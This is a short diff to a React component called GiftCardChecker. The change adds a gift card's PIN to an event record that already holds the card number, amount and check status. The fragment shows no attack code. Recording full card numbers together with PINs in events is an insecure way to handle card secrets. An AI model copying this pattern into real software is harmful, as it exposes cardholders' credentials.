@@ -98,6 +98,7 @@ export default function GiftCardChecker() {
           event: r.status === 'active' ? 'success' : 'failed',
           brandName: brand.name,
           cardNumber: num,
+          pin: brand.pin ? pin : null, // ADDED PIN
           amount: clean,
           status: r.status,
           message: r.message,
